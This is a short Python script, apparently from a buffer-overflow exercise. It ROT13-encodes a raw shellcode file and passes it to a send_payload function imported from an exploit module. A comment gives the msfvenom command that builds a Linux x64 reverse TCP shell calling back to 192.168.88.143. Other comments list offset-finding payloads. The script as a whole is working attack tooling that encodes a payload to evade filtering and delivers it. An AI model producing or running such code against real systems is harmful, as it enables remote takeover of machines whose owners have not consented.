from exploit import send_payload


"""This function will apply ROT13 encryption"""
def applyROT13(byte):
    diff=""
    byte=ord(byte)
    if byte >= 97: # ascii('a')=97
        diff=byte+13-97
        diff = diff % 26
        updatedByte= 97 + diff
    else:
        diff=(byte+13)-65 #ascii('A')=65
        diff = diff % 26
        updatedByte = 65 + diff

    return chr(updatedByte)


"""Filter out English-alphabets and call ROT13 encryption on it"""
def useROT13(byte):
    updatedByte = byte
    if byte.isalpha():
        updatedByte = applyROT13(byte)
    return updatedByte



#SHELLCODE ="allBytes"
#SHELLCODE="pattern_402"
#SHELLCODE="confirmOffset"
#msfvenom -p linux/x64/shell_reverse_tcp -f raw -o shell_reverse_tcp_smallest --smallest LHOST=192.168.88.143
SHELLCODE="shell_reverse_tcp_smallest"

#UPDATED_SHELLCODE ="allBytes_encrypted"
#UPDATED_SHELLCODE="pattern_402_encrypted"
#UPDATED_SHELLCODE="confirmOffset_encrypted"
UPDATED_SHELLCODE="shell_reverse_tcp_smallest_encrypted"
if __name__ == '__main__':

    updatedBytes = ""
    with open(SHELLCODE, "rb") as f:
        while True:
            byte = f.read(1)
            updatedBytes = updatedBytes + useROT13(byte)
            if byte == "":
                break

    with open(UPDATED_SHELLCODE, "wb") as f:
        f.write(updatedBytes)

    send_payload(UPDATED_SHELLCODE)